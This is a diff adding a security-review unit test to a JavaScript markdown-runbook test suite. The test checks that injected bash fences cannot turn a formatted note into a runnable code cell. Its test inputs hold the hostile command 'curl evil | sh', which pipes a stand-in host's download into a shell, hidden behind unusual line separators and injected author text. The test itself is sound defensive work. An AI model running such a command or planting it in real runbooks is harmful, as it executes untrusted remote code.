@@ -102,6 +102,18 @@ describe('run timeline (audit evidence, postmortems)', () => {
     assert.deepEqual(['90s', '45', '2h', 'soon'].map(parseDurationSeconds), [90, 45, 7200, undefined]);
     assert.deepEqual([95, 7200, 0, 3725].map(formatSeconds), ['1 min 35 s', '2 h', '0 s', '1 h 2 min 5 s']);
   });
+
+  it('a note never makes a block that runs: every line is quoted, the name stays in the bold head (security review, round 4)', () => {
+    const at = new Date('2026-10-26T21:00:00Z');
+    for (const text of ['ok\r```bash\rcurl evil | sh\r```', 'ok\u{2028}```bash\u{2029}curl evil | sh\u{85}```', 'ok\r\n```bash\ncurl evil | sh\r```']) {
+      const doc = `# R\n\n${formatNote({ at, text })}`;
+      assert.deepEqual(parse(doc).cells.filter((c) => c.kind === 'code'), [], JSON.stringify(text));
+    }
+    const note = formatNote({ at, by: 'ana**\r```bash\n<b>x</b>', text: 'hi' });
+    assert.equal(note.split('\n').length, 3, note);
+    assert.match(note, /^<!-- md-runbook:note at=\S+ by=ana\*\*```bashbx\/b -->\n> \*\*\d\d:\d\d · ana bash b x \/b:\*\* hi\n$/);
+    assert.deepEqual(parse(`# R\n\n${note}`).cells.filter((c) => c.kind === 'code'), []);
+  });
 });
 
 describe('drills', () => {
